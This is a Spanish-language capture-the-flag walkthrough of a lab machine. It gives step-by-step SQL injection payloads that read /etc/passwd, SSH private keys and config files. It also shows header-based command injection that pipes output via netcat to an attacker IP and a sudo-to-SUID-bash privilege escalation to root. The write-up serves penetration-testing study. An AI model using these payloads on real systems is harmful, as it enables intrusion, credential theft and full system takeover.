## Summary

- IP -> 10.10.11.128
- Ports -> TCP (80), UDP (idk)
- OS ->  Linux 
- Services & Applications
    - 80 -> http
    -  -> 

## Recon
- Launchpad
- Comando -> **whatweb http://< URL>**  Nos dara una breve descripcion del gestor de contenidos del puerto 80
- Comando -> **curl -s -X GET "http://< IP>" -I** Miramos las cabeceras de la pagina web (I=i mayuscula,s=silence)

❯ **nmap --script http-enum -p 80 10.10.11.130 -oN WebScan** 
-   -p80 -> Indica el puerto que se quiere escanear
-   10.10.11.130 -> Dirección IP que se quiere escanear
-   -oN WebScan -> Exporta el output a un fichero en formato nmap con nombre “WebScan”
-  http-enum -> Aplica Fuzing a HTTP, utiliza un diccionario de 1000 rutas y ver si hay algunas rutas existen

Miramos desde el navegador Web

- La web interpreta PHP
- Comando -> **wfuzz -c --hc=404 -t 200 -w < RUTA DICCIONARIO> http://10.10.11.128/FUZZ.php** Hacemos fuzing a una pagina web especifica para poder encontrar subdominios con un diccionario especifico, y el diccionario se aplicara en la palabra FUZZ (c=colorizado, w=wordlist, hc=hidecode, hh=hide characters ch en caso que sea necesario, t=tareas simultaneas). Es importante poner el nombre de la url, ya que muchas veces con la pura IP no encuentra nada. 
	- **/usr/share/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt**

Empezamos a probar inyecciones SQL y miramos que algunas si se pueden 
	**omar’or 1=1-- -** Aqui no me sale el here
	**omar'order by 10-- -** Aqui si sale el here
	**omar'union select 1-- -** Aqui miramos que tenemos una inyeccion sql **database()** podemos sustituir eso en 1 y nos regresa el nombre de la base de datos
	**omar'union select version()-- -** Nos muestra la version 
	**omar'union select user()-- -** Nos muestra el nombre del usuario 'uhc@local'
	**omar'union select load_file("/etc/passwd")-- -** Miramos el /etc/passwd de la maquina

Para mirara mejor lo podemos hacer por BurpSuite.
	**omar'union select load_file("/home/htb/.ssh/id_rsa")-- -** Para ver si podemos ver el id_rsa de la maquina victima del usuario htb
	**omar'union select load_file("/home/uhc/.ssh/id_rsa")-- -** Para ver si podemos ver el id_rsa de la maquina victima del usuario uhc
	**omar'union select load_file("/home/uhc/user.txt")-- -** Para ver si podemos ver la flag de usuario user.txt

Podemos usar eso para poder enumerar informacion 
	**'union select schema_name from information_schema.schemata -- -** Pone el resultado en forma de lista
	**'union select *group_concat*(schema_name) from information_schema.schemata -- -** Para listar mas bases de datos al mismo tiempo
	**'union select *group_concat*(table_name) from information_schema.tables WHERE table_schema='*November*'-- -** Lista las tablas de una base de datos especifica
	**'union select *group_concat*(column_name) from information_schema.columns WHERE table_schema='*November*' and table_name='*"flag"*' -- -** Lista las columnas de una base de datos especifica, donde tambien tenemos una tabla especifica, pero en ocasiones lo debemos de representar en hexadecimal 

- Comando -> **echo -n "flag" | xxd -ps** Convertimos una palabra en hexadecimal, flag = 666c 6167 = 0x666c6167

	**'union select *group_concat*(column_name) from information_schema.columns WHERE table_schema='*November*' and table_name='*0x666c6167*' -- -** Lista las columnas de una base de datos especifica, donde tambien tenemos una tabla especifica

Aveces no fucniona por lo que solo lo dejamos asi:
	**'union select *group_concat*(table_name,":",column_name) from information_schema.columns WHERE table_schema='*November*'-- -**  Otra forma de representar la linea anterior
	**'union select *group_concat*(one) from flag** Enumeraremos la flag

Y lo que obtenemos lo colocamos en la pagina en donde debemos de ingresar la primer flag.

Volvemos a hacer un escaneo de nmap.
	**'union select *group_concat*(player) from players** Enumeraremos los usuarios pero salen nombres que no son de usuarios.

Recoramos que en Wfuzz logramos enumerar un dir llamado 'config', por lo que probamos esa ruta en el navegador web. Pero no nos arroja nada, por lo que probamos la ruta tipica de los servidores web.
	**omar'union select load_file("/var/www/html/config.php")** Mirar el archivo config.php

## User
- Comando -> **ssh < user>@< IP>** Para conectarnos por ssh
- Comando -> **whoami**
- Comando -> **ifconfig**

- Comando -> **id**
- Comando -> **sudo -l** Ver que permisos tenemos en el sudoers (l=ele)
- Comando -> **lsb_release -a** Ver que tipo de OS es

- Comando -> **find / -perm -4000 2>/dev/null** Buscaremos por privilegios suid, para aprovecharnos de un binario y escalar privilegios
- Comando -> **systemctl list-timers** Miraremos si hay tareas a punto de ejecutarse
- Comando -> **cat /etc/crontab** Para ver si hay una tarea interesante 

Nos dirigimos a la ruta del firewall ya que nos podria ayudar a escalar privilegios.

- Comando -> **cd /var/www/html/firewall.php** 

Podemos ver la cabecera X_FORWARDED_FOR que evita ser bloqueado

Por lo que podemos colocar algo en esa cabecera con curl 

- Comando -> **curl -s -X GET http://localhost/firewall.php -H "X_FORWARDED_FOR: 1.1.1.1; ping -c 1 10.10.14.17;"**
	- 1.1.1.1 -> Vale esa ip
	- 10.10.14.17 -> Nuestra IP
	- ping -c -> Comando a ejecutar 

Nos da acceso denegado. Por lo que nos traemos la Cookie de Session del BurpSuite
- Comando -> **curl -s -X GET http://localhost/firewall.php -H "X_FORWARDED_FOR: 1.1.1.1; ping -c 1 10.10.14.17;" -H "Cookie: PHIDRHNED"**
	- 1.1.1.1 -> Vale esa ip
	- 10.10.14.17 -> Nuestra IP
	- ping -c -> Comando a ejecutar 
	- Cookie -> Esta nos ayuda a que sirva el comando

- Comando -> **tcpdump -i < INTERFACE> icmp -n** (n=no resolucion DNS) Nos ponemos en escucha para trazas icmp y recibir los pings

Por lo que podemos ejecutar comandos

- Comando -> **curl -s -X GET http://localhost/firewall.php -H "X_FORWARDED_FOR: 1.1.1.1; whoami | nc 10.10.14.17 443;" -H "Cookie: PHIDRHNED"**
	- 1.1.1.1 -> Vale esa ip
	- 10.10.14.17 -> Nuestra IP
	- whoami -> Comando a ejecutar 
	- Cookie -> Esta nos ayuda a que sirva el comando

- Comando -> **nc -nlvp 443** Nos ponemos en escucha por el puerto 443, maquinas Linux, para recibir el resultado por netcat y miraremos que usuario es el que manda la peticion

- Comando -> **curl -s -X GET http://localhost/firewall.php -H "X_FORWARDED_FOR: 1.1.1.1; sudo -l | nc 10.10.14.17 443;" -H "Cookie: PHIDRHNED"**
	- 1.1.1.1 -> Vale esa ip
	- 10.10.14.17 -> Nuestra IP
	- sudo -l -> Comando a ejecutar (l=ele) 
	- Cookie -> Esta nos ayuda a que sirva el comando

- Comando -> **nc -nlvp 443** Nos ponemos en escucha por el puerto 443, maquinas Linux, para recibir el resultado por netcat y mirar si tiene privilegios asignados a sudoers


## Root

Este comando lo hacemos desde la terminal del usuario uhc
- Comando -> **curl -s -X GET http://localhost/firewall.php -H "X_FORWARDED_FOR: 1.1.1.1; sudo chmod u+s /bin/bash | nc 10.10.14.17 443;" -H "Cookie: PHIDRHNED"**
	- 1.1.1.1 -> Vale esa ip
	- 10.10.14.17 -> Nuestra IP
	- sudo -l -> Comando a ejecutar (l=ele) 
	- Cookie -> Esta nos ayuda a que sirva el comando

- Comando -> **nc -nlvp 443** Nos ponemos en escucha por el puerto 443, maquinas Linux, para recibir el resultado por netcat y mirar si tiene privilegios asignados a sudoers

Esto nos ayudar a entablarnos una revershell y lo haremos asignado a otros la bash privilegiada
- Comando -> **bash -p** Nos otorgara una bash como el propietarios que es root, esto temporalmente (p=privilege)

Despues podemos visualizar la flag root.txt